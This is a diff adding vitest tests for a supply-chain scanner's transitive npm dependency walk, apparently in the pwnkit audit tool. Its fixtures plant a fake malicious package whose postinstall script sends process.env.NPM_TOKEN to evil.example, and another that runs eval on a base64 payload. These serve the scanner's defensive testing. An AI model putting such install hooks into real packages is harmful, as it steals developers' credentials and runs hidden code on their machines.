@@ -1,5 +1,15 @@
-import { describe, expect, it, vi, afterEach } from "vitest";
-import { parseOsvAdvisories, queryOsvAdvisories, summarizeKnownAdvisoriesFinding } from "./audit.js";
+import { describe, expect, it, vi, afterEach, beforeEach } from "vitest";
+import { mkdtempSync, mkdirSync, writeFileSync, rmSync } from "node:fs";
+import { join } from "node:path";
+import { tmpdir } from "node:os";
+import type { AuditConfig } from "@pwnkit/shared";
+import {
+  parseOsvAdvisories,
+  queryOsvAdvisories,
+  summarizeKnownAdvisoriesFinding,
+  runSupplyChainScan,
+} from "./audit.js";
+import type { InstalledPackage } from "./package-ecosystems.js";
 
 describe("parseOsvAdvisories", () => {
   it("maps OSV vulnerabilities into NpmAuditFinding shape", () => {
@@ -148,5 +158,75 @@ describe("summarizeKnownAdvisoriesFinding", () => {
       [],
     );
     expect(finding).toBeNull();
+  });
+});
+
+// ── runSupplyChainScan — transitive walk wiring (issue #565) ─────────────────
+
+describe("runSupplyChainScan", () => {
+  let work: string;
+
+  beforeEach(() => {
+    work = mkdtempSync(join(tmpdir(), "supply-chain-scan-test-"));
+  });
+  afterEach(() => {
+    rmSync(work, { recursive: true, force: true });
+  });
+
+  function plant(rel: string, name: string, version: string, scripts?: Record<string, string>, files?: Record<string, string>): void {
+    const dir = join(work, rel);
+    mkdirSync(dir, { recursive: true });
+    writeFileSync(join(dir, "package.json"), JSON.stringify({ name, version, scripts: scripts ?? {} }));
+    for (const [f, content] of Object.entries(files ?? {})) {
+      const abs = join(dir, f);
+      mkdirSync(abs.slice(0, abs.lastIndexOf("/")), { recursive: true });
+      writeFileSync(abs, content);
+    }
+  }
+
+  const baseConfig: AuditConfig = { package: "my-app", depth: "standard", format: "json" };
+  const pkg: () => InstalledPackage = () => ({
+    ecosystem: "npm",
+    name: "my-app",
+    version: "1.0.0",
+    path: join(work, "node_modules", "my-app"),
+    tempDir: work,
+  });
+
+  it("flags a malicious transitive dep under a clean root (acceptance)", async () => {
+    plant("node_modules/my-app", "my-app", "1.0.0"); // clean root, no scripts
+    plant("node_modules/clean-dep", "clean-dep", "1.0.0");
+    plant(
+      "node_modules/evil-dep",
+      "evil-dep",
+      "6.6.6",
+      { postinstall: "node steal.js" },
+      { "steal.js": "fetch('http://evil.example/' + process.env.NPM_TOKEN);" },
+    );
+
+    const findings = await runSupplyChainScan(pkg(), baseConfig, () => {});
+    const hook = findings.find((f) => f.templateId === "malicious-install-hook");
+    expect(hook).toBeDefined();
+    expect(hook?.supplyChain?.relation).toBe("transitive");
+    expect(hook?.supplyChain?.package).toBe("evil-dep@6.6.6");
+    expect(hook?.title).toContain("[transitive]");
+    // source evidence: the scanned script content shows up in the finding
+    expect(hook?.evidence?.analysis).toContain("install-script reader");
+  });
+
+  it("does nothing for a non-npm ecosystem", async () => {
+    const findings = await runSupplyChainScan(
+      { ...pkg(), ecosystem: "pypi" },
+      baseConfig,
+      () => {},
+    );
+    expect(findings).toEqual([]);
+  });
+
+  it("honours a transitiveAuditBudget of 0 (root-only)", async () => {
+    plant("node_modules/my-app", "my-app", "1.0.0");
+    plant("node_modules/evil-dep", "evil-dep", "6.6.6", { postinstall: "node s.js" }, { "s.js": "eval(atob('eg=='));" });
+    const findings = await runSupplyChainScan(pkg(), { ...baseConfig, transitiveAuditBudget: 0 }, () => {});
+    expect(findings).toEqual([]);
   });
 });
